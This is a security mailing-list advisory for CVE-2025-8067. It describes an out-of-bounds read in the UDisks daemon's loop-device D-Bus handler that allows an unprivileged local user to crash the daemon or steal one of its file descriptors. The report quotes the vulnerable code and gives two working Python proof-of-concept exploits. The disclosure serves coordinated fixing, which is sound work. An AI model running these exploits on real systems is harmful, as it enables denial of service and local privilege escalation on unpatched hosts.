Received: (qmail 24476 invoked by uid 550); 28 Aug 2025 15:21:31 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 15727 invoked from network); 28 Aug 2025 14:40:32 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
	s=mimecast20190719; t=1756392022;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:cc:mime-version:mime-version:content-type:content-type;
	bh=89Typ5JjIolAa+eu/d0zSFA+P3pDe6NZKMg1ULqz+NY=;
	b=Bi3w2SoMY34zhRikEPZhUHUqn+mEKp01XpMlQVQu23Sl6CXwIMxdBdNS4MKit6/DZEBiWX
	rBwnux8X/xrBeDw7BuecxB5w7xtmO1OX/uWCykNffpNgiHd9l6ziFJyZfuOcPgpV8O7qXg
	N0qS4h81TSYeoA5K6hAUhhNjgRrBOJQ=
X-MC-Unique: NwFvYCt7NE2kRBl8hvW3Yw-1
X-Mimecast-MFC-AGG-ID: NwFvYCt7NE2kRBl8hvW3Yw_1756392019
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1756392019; x=1756996819;
        h=cc:to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=89Typ5JjIolAa+eu/d0zSFA+P3pDe6NZKMg1ULqz+NY=;
        b=dPRcCG9AUZo45GxEk9C2U9lU3oCHtgxUvVu8XxPanuhYUY88OzxMUOfKLe8KIyFonj
         iKT7+z/wLqEeavS3hpBdHzze6TKSJz4klM1e7TCXzlMHQW/aF7H2MbHmo39vGf42BGGu
         kqxCPctNa0gAEUW5HgH2rg+oyaxJHatgWz3ceT6teYB70258hhN3At7nS7UQPr7+AnMV
         C16Shimct0IPlBf2uVkBgK6ta1WCq2VGpJm1Z37RYYWXiKjCW9vrPtVVpW/WGSsuUID5
         z/VpVdjonpsC6Q5pl24+J5TUodrJwmiat+AXo+/NdaGXwovdraLe2KXNcQZsG8V6qVdr
         eiGA==
X-Gm-Message-State: AOJu0Yw/3s4rVMrLMBH9xTwZ3dEhnpVi7/7XzjjUm7i4PoE1JvXUGtaE
	r7a4U/8On7HA6795Hly6MbP+CUpyRMHWqX1vjqiTnkYtaefRaqqI5/eMJb6cw/mds+CqY7JSo4U
	7w5MqWA69aWoJxQioyHrbZbhlpy7w8WKxV7pXcyXPObTAJtO5xFhHLTsWQYF+7u9ZwxNa6jp+kW
	XP7N2UH6hwJ6YsK93JZQOvT5/0Pigd6ui97k6FMQGvlOTaSIUFiEkO2sU=
X-Gm-Gg: ASbGnctFn4pAfeZRxf74kymfoegU1NEJfBW6GwNBK5QgsWNYc7NeL6n67xLqFn8Pdb4
	rXB8/HzZ00blXmXmF+dTc60Ldg3fdwA5tNwkxnq7b7tdSG50evJkHm2mtpd0RNs0EhZ5QixWtAT
	znT3BW5x5MQ2Juf6uQDaG6kQ==
X-Received: by 2002:a17:902:e5c5:b0:248:ef1f:bbbe with SMTP id d9443c01a7336-248ef1fbf53mr18383935ad.0.1756392018938;
        Thu, 28 Aug 2025 07:40:18 -0700 (PDT)
X-Google-Smtp-Source: AGHT+IG7DhDGYp6x30LLHoeKMDJPcZf+9TRZDoxtE50hip0XCVs0dtiz4wxVaYOInlOdLB7A6U8QuOQhVBGf1/bTsMY=
X-Received: by 2002:a17:902:e5c5:b0:248:ef1f:bbbe with SMTP id
 d9443c01a7336-248ef1fbf53mr18383465ad.0.1756392018388; Thu, 28 Aug 2025
 07:40:18 -0700 (PDT)
MIME-Version: 1.0
From: Marco Benatto <mbenatto@redhat.com>
Date: Thu, 28 Aug 2025 11:39:42 -0300
X-Gm-Features: Ac12FXz-sGdIPgttJYGziG720jkKivn3K62VVRBGW7qFl6DkELp442XdE_eX7OU
Message-ID: <CAOGQQ28=RumQ21g-PFw=hNX3qpkyViYzCjPPqZLVJu8SWry05A@mail.gmail.com>
To: oss-security@lists.openwall.com
Cc: Tomas Bzatek <tbzatek@redhat.com>, Marc Deslauriers <marc.deslauriers@canonical.com>
X-Mimecast-Spam-Score: 0
X-Mimecast-MFC-PROC-ID: 76TFx8ww8F3YsR1fLSgvLHO0wcZh3gZX5z83nRXA6XQ_1756392019
X-Mimecast-Originator: redhat.com
Content-Type: text/plain; charset="UTF-8"
Subject: [oss-security] CVE-2025-8067 - UDisks

Hello,

the Red Hat Product Security team has received a report for a
vulnerability in the UDisks daemon.
Coordinating with the report and the upstream developers we have
assigned CVE-2025-8067 with the CVSSv3.1 score of:

CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:H - 8.5

This issue is fixed in udisks2 versions 2.10.91 and 2.10.2
The upstream advisory is available at:

https://github.com/storaged-project/udisks/security/advisories/GHSA-742q-gggc-473g

Please find out the full report sent on behalf of the reporter:

===== FULL REPORT =====

==============================
  SUMMARY
==============================

Title: Out-Of-Bounds Read in UDisks Daemon
CVSS: 8.5 High CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:H
Version: Ubuntu 24.04.2 LTS, udisks2 2.10.1-6ubuntu1.2

The UDisks daemon contains an out-of-bounds (OOB) read vulnerability
that can be triggered by an unprivileged user via system bus. Successful
exploitation leads to a crash of the daemon process, or mapping of an
internal file descriptor from the daemon process onto a loop device,
likely resulting in local privilege escalation.

==============================
  DETAILS
==============================

The UDisks daemon enables unprivileged users to create loop devices
through the D-BUS system bus. Its handler accepts multiple arguments,
including fd_list and fd_index, which are used to specify the backing
file for the loop device.

Although there is a check in place [0] to ensure that fd_index does not
exceed the bounds of the fd_list array, there is no validation for the
lower bound. As a result, passing a negative value for fd_index leads to
an out-of-bounds (OOB) read vulnerability [1].

udisks - src/udiskslinuxmanager.c
----------------------------------------
static gboolean
handle_loop_setup (UDisksManager          *object,
                    GDBusMethodInvocation  *invocation,
                    GUnixFDList            *fd_list,
                    GVariant               *fd_index,
                    GVariant               *options)
{
     (...)
     fd_num = g_variant_get_handle (fd_index);
     // [0] upper bound check
     if (fd_list == NULL || fd_num >= g_unix_fd_list_get_length
(fd_list))
         {
             (...)
             goto out;
     (...)
     fd = g_unix_fd_list_get (fd_list, fd_num, &error);
     (...)
     if (!bd_loop_setup_from_fd (fd,
                                 option_offset,
                                 option_size,
                                 option_read_only,


GLib - gio/gunixfdlist.c
----------------------------------------
gint
g_unix_fd_list_get (GUnixFDList  *list,
                     gint          index_,
                     GError      **error)
{
   (...)

   // [1] OOB read
   return dup_close_on_exec_fd (list->priv->fds[index_], error);
}

Successful exploitation of this vulnerability can have two consequences.
First, it can cause the daemon process to crash, resulting in a denial
of service. Second, an attacker can use this to map an internal file
descriptor from the daemon process onto a loop device. This occurs
because the value returned by the OOB read is interpreted as a file
descriptor; if it corresponds to a valid open descriptor in the daemon
process, it can be successfully mapped to a loop device. This can open
up attack paths leading to local privilege escalation.

For example: An attacker could potentially coerce the daemon process
into opening an arbitrary file, creating a file descriptor that could
then be inadvertently exposed and reused in this way.

==============================
   PROOF OF CONCEPT
==============================

POC: Crash
----------------------------------------
from gi.repository import Gio, GLib

oob_idx = -2**30

bus = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)
proxy = Gio.DBusProxy.new_sync(
     bus,
     Gio.DBusProxyFlags.NONE,
     None,
     "org.freedesktop.UDisks2",
     "/org/freedesktop/UDisks2/Manager",
     "org.freedesktop.UDisks2.Manager",
     None
)

proxy.call_with_unix_fd_list_sync(
     "LoopSetup",
     GLib.Variant("(ha{sv})", (oob_idx, {})),
     Gio.DBusCallFlags.NONE,
     -1,
     Gio.UnixFDList.new_from_array([1]),
     None,
)

POC: "Stealing" file descriptor of daemon process
----------------------------------------
from gi.repository import Gio, GLib

def setup_loop(bus, idx):
     proxy = Gio.DBusProxy.new_sync(
         bus,
         Gio.DBusProxyFlags.NONE,
         None,
         "org.freedesktop.UDisks2",
         "/org/freedesktop/UDisks2/Manager",
         "org.freedesktop.UDisks2.Manager",
         None
     )

     fdlist = Gio.UnixFDList()
     fdlist.append(1)

     result = proxy.call_with_unix_fd_list_sync(
         "LoopSetup",
         GLib.Variant("(ha{sv})", (idx, {})),
         Gio.DBusCallFlags.NONE,
         -1,
         fdlist,
         None,
     )

     return result[0].unpack()[0]


def get_backing_file(bus, dev):
     proxy = Gio.DBusProxy.new_sync(
         bus,
         Gio.DBusProxyFlags.NONE,
         None,
         "org.freedesktop.UDisks2",
         dev,
         "org.freedesktop.UDisks2.Loop",
         None
     )
     return bytes(proxy.get_cached_property("BackingFile")).decode()


if __name__ == "__main__":
     bus = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)

     print("[+] Trying loop setup with oob indices")
     for i in range(-1, -1000, -1):
         try:
             dev = setup_loop(bus, i)
             print("[+] Hit valid fd at index", i)
             print("[+] Setup loop device", dev)
             break
         except Exception:
             pass

     backing_file = get_backing_file(bus, dev)
     print("[+] Stole fd for", backing_file)

Please let me know if you need any additional details.

I would be happy to be credited as "Michael Imfeld (born0monday)".

Marco Benatto
Red Hat Product Security
secalert@redhat.com for urgent response

